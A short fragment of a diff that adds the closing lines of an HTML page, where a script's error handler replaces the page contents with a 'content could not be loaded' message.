+                    d.documentElement.innerHTML = 'Error: Content could not be loaded.';
+                }
+            })();
+        </script>
+    </body></html>
